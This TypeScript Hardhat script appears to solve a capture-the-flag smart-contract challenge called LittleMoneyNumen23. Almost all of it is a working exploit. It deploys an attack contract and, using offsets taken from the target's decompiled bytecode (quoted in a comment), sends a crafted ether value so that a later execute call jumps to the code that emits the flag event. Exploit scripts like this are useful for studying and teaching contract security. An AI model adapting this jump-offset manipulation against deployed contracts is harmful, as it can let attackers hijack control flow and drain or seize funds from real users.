import chalk from "chalk";
import { ethers } from "hardhat";
import { LittleMoneyNumen23__factory, LittleMoneyNumen23, LittleMoneyNumen23Attack__factory } from "../../typechain";
import { log, initialize } from "../utils";


async function main() {
    let [littleMoneyNumen23Contract, attacker] = await initialize<LittleMoneyNumen23>(LittleMoneyNumen23__factory);

    const littleMoneyNumen23Attack = await new LittleMoneyNumen23Attack__factory(attacker).deploy();
    await littleMoneyNumen23Attack.waitForDeployment();
    
    // log(`Deployed code: ${await ethers.provider.getCode(await littleMoneyNumen23Contract.getAddress())}`);
    // "deployedBytecode": "0x6080604052600436106100385760003560e01c80634b64e4921461004457806380e10aa51461006d578063b15be2f5146100775761003f565b3661003f57005b600080fd5b34801561005057600080fd5b5061006b600480360381019061006691906104cc565b61008e565b005b6100756101ea565b005b34801561008357600080fd5b5061008c6102be565b005b8060008273ffffffffffffffffffffffffffffffffffffffff167fbfa814b5f223311c5be446e7e7adb4ccb8dc1ea8f34511e8fb1f4900359a50036040516020016100d99190610534565b6040516020818303038152906040526040516100f591906105c9565b600060405180830381855af49150503d8060008114610130576040519150601f19603f3d011682016040523d82523d6000602084013e610135565b606091505b50509050801561017a576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016101719061063d565b60405180910390fd5b60008061018561035b565b809250819350505043821461019957600080fd5b6101a161044b565b6102be816000019067ffffffffffffffff16908167ffffffffffffffff16815250508181510181526101d9816000015163ffffffff16565b505050506101e68161038a565b5050565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161461024257600080fd5b60013414610285576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161027c906106a9565b60405180910390fd5b7f2d3bd82a572c860ef85a36e8d4873a9deed3f76b9fddbf13fbe4fe8a97c4a579336040516102b491906106d8565b60405180910390a1565b600073ffffffffffffffffffffffffffffffffffffffff1660008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16141561031857600080fd5b60008060006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550565b60008060403d1461036b57600080fd5b60405160406000823e63ffffffff815116925080602001519150509091565b600061039582610413565b9050806103d7576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016103ce9061073f565b60405180910390fd5b8173ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161461040f57600080fd5b5050565b600080823b9050600081141561042d576000915050610446565b600c811115610440576000915050610446565b60006020f35b919050565b604051806020016040528061045f81525090565b61046761075f565b565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006104998261046e565b9050919050565b6104a98161048e565b81146104b457600080fd5b50565b6000813590506104c6816104a0565b92915050565b6000602082840312156104e2576104e1610469565b5b60006104f0848285016104b7565b91505092915050565b60007fffffffff0000000000000000000000000000000000000000000000000000000082169050919050565b61052e816104f9565b82525050565b60006020820190506105496000830184610525565b92915050565b600081519050919050565b600081905092915050565b60005b83811015610583578082015181840152602081019050610568565b83811115610592576000848401525b50505050565b60006105a38261054f565b6105ad818561055a565b93506105bd818560208601610565565b80840191505092915050565b60006105d58284610598565b915081905092915050565b600082825260208201905092915050565b7f6e6f20636f766572210000000000000000000000000000000000000000000000600082015250565b60006106276009836105e0565b9150610632826105f1565b602082019050919050565b600060208201905081810360008301526106568161061a565b9050919050565b7f49206f6e6c79206e6565642061206c6974746c65206d6f6e6579210000000000600082015250565b6000610693601b836105e0565b915061069e8261065d565b602082019050919050565b600060208201905081810360008301526106c281610686565b9050919050565b6106d28161048e565b82525050565b60006020820190506106ed60008301846106c9565b92915050565b7f7065726d697373696f6e00000000000000000000000000000000000000000000600082015250565b6000610729600a836105e0565b9150610734826106f3565b602082019050919050565b600060208201905081810360008301526107588161071c565b9050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052605160045260246000fdfea264697066735822122098664b0e64af91cf350202ed32dac8c0635a4f64366554288e113c5b0153462664736f6c634300080c0033"
    let emitAddress = 0x285;
    let renounceAddress = 0x2be;
    let delta = emitAddress - renounceAddress;
    let offset = delta>0?delta:(delta+2**32);

    let tx = await attacker.sendTransaction({
        to: await littleMoneyNumen23Contract.getAddress(),
        value: offset
    })
    await tx.wait();
    
    const filter = littleMoneyNumen23Contract.filters.SendFlag();
    littleMoneyNumen23Contract.once(filter, (sender: string) => {
        log(`SendFlag event is triggered by successfully!`);
        process.exit(0);
    });
    tx = await littleMoneyNumen23Contract.execute(await littleMoneyNumen23Attack.getAddress());
    await tx.wait();
    log(`${chalk.yellow("Failed!")}`);

}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});